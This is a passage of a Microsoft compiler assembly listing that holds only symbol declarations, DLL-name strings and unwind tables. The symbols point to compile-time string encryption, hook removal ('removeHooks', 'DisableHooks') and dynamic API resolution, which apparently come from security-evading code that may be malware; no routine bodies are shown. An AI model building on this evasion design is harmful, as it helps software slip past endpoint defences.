; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0N@MDJJJHMB@kernel32?4dll@		; `string'
PUBLIC	??_C@_0L@EANHMAHB@ws2_32?4dll@			; `string'
PUBLIC	??_C@_0N@DOHINHCI@Advapi32?4dll@		; `string'
PUBLIC	??_C@_09FLKFJBLM@ntdll?4dll@			; `string'
PUBLIC	??_C@_0N@NKKEACFL@Rstrtmgr?4dll@		; `string'
PUBLIC	??_C@_09MDJBOJHM@Ole32?4dll@			; `string'
PUBLIC	??_C@_0N@BHPCGNMJ@OleAut32?4dll@		; `string'
PUBLIC	??_C@_0N@NKMBPHLD@Netapi32?4dll@		; `string'
PUBLIC	??_C@_0N@KCFEDKNO@Iphlpapi?4dll@		; `string'
PUBLIC	??_C@_0M@OHCDEFLB@Shlwapi?4dll@			; `string'
PUBLIC	??_C@_0M@LNAMDANG@Shell32?4dll@			; `string'
EXTRN	__security_check_cookie:PROC
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
;	COMDAT ??_C@_0M@LNAMDANG@Shell32?4dll@
CONST	SEGMENT
??_C@_0M@LNAMDANG@Shell32?4dll@ DB 'Shell32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@OHCDEFLB@Shlwapi?4dll@
CONST	SEGMENT
??_C@_0M@OHCDEFLB@Shlwapi?4dll@ DB 'Shlwapi.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@KCFEDKNO@Iphlpapi?4dll@
CONST	SEGMENT
??_C@_0N@KCFEDKNO@Iphlpapi?4dll@ DB 'Iphlpapi.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@NKMBPHLD@Netapi32?4dll@
CONST	SEGMENT
??_C@_0N@NKMBPHLD@Netapi32?4dll@ DB 'Netapi32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@BHPCGNMJ@OleAut32?4dll@
CONST	SEGMENT
??_C@_0N@BHPCGNMJ@OleAut32?4dll@ DB 'OleAut32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09MDJBOJHM@Ole32?4dll@
CONST	SEGMENT
??_C@_09MDJBOJHM@Ole32?4dll@ DB 'Ole32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@NKKEACFL@Rstrtmgr?4dll@
CONST	SEGMENT
??_C@_0N@NKKEACFL@Rstrtmgr?4dll@ DB 'Rstrtmgr.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09FLKFJBLM@ntdll?4dll@
CONST	SEGMENT
??_C@_09FLKFJBLM@ntdll?4dll@ DB 'ntdll.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@DOHINHCI@Advapi32?4dll@
CONST	SEGMENT
??_C@_0N@DOHINHCI@Advapi32?4dll@ DB 'Advapi32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@EANHMAHB@ws2_32?4dll@
CONST	SEGMENT
??_C@_0L@EANHMAHB@ws2_32?4dll@ DB 'ws2_32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@MDJJJHMB@kernel32?4dll@
CONST	SEGMENT
??_C@_0N@MDJJJHMB@kernel32?4dll@ DB 'kernel32.dll', 00H	; `string'
CONST	ENDS
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?removeHooks@@YAXPEAUHINSTANCE__@@@Z		; removeHooks
PUBLIC	?isForwardedFunc@@YA_NPEBX@Z			; isForwardedFunc
PUBLIC	?ah_isalfanum@@YA_ND@Z				; ah_isalfanum
PUBLIC	?Rva2Offset@@YAKK_K@Z				; Rva2Offset
PUBLIC	?m_memcmp@@YAHPEBX0_K@Z				; m_memcmp
PUBLIC	?DisableHooks@@YAXXZ				; DisableHooks
PUBLIC	?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z ; apGetProcAddress
PUBLIC	?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z	; apLoadLibraryA
PUBLIC	?apVirtualProtect@@YAHPEAX_KKPEAK@Z		; apVirtualProtect
PUBLIC	?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z		; apMapViewOfFile
PUBLIC	?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z ; apCreateFileMappingW
PUBLIC	?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z ; apGetModuleFileNameW
PUBLIC	?pCloseHandle@@YAHPEAX@Z			; pCloseHandle
PUBLIC	?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z ; pCreateFileW
PUBLIC	?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z	; pGetFileSizeEx
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	__xmm@00000000000000070000000000000000
EXTRN	_CxxThrowException:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__chkstk:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	memset:PROC
EXTRN	__ImageBase:BYTE
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176
	DD	imagerel $LN176+385
	DD	imagerel $unwind$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176+385
	DD	imagerel $LN176+590
	DD	imagerel $chain$0$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176+590
	DD	imagerel $LN176+1141
	DD	imagerel $chain$4$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176+1141
	DD	imagerel $LN176+1149
	DD	imagerel $chain$5$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176+1149
	DD	imagerel $LN176+1175
	DD	imagerel $chain$6$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$?removeHooks@@YAXPEAUHINSTANCE__@@@Z DD imagerel $LN176+1175
	DD	imagerel $LN176+1229
	DD	imagerel $chain$7$?removeHooks@@YAXPEAUHINSTANCE__@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Rva2Offset@@YAKK_K@Z DD imagerel $LN25
	DD	imagerel $LN25+162
	DD	imagerel $unwind$?Rva2Offset@@YAKK_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?DisableHooks@@YAXXZ DD imagerel $LN523
	DD	imagerel $LN523+2302
	DD	imagerel $unwind$?DisableHooks@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?apGetProcAddress@@YAP6A_JXZPEAUHINSTANCE__@@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?apLoadLibraryA@@YAPEAUHINSTANCE__@@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apVirtualProtect@@YAHPEAX_KKPEAK@Z DD imagerel $LN4
	DD	imagerel $LN4+76
	DD	imagerel $unwind$?apVirtualProtect@@YAHPEAX_KKPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z DD imagerel $LN4
	DD	imagerel $LN4+50
	DD	imagerel $unwind$?apMapViewOfFile@@YAPEAXPEAXKKK_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+60
	DD	imagerel $unwind$?apCreateFileMappingW@@YAPEAXPEAXPEAU_SECURITY_ATTRIBUTES@@KKKPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z DD imagerel $LN4
	DD	imagerel $LN4+61
	DD	imagerel $unwind$?apGetModuleFileNameW@@YAKPEAUHINSTANCE__@@PEA_WK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCloseHandle@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pCloseHandle@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+89
	DD	imagerel $unwind$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z
;	COMDAT __xmm@00000000000000070000000000000000
CONST	SEGMENT
__xmm@00000000000000070000000000000000 DB 00H, 00H, 00H, 00H, 00H, 00H, 00H
	DB	00H, 07H, 00H, 00H, 00H, 00H, 00H, 00H, 00H
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetFileSizeEx@@YAHPEAXPEAT_LARGE_INTEGER@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
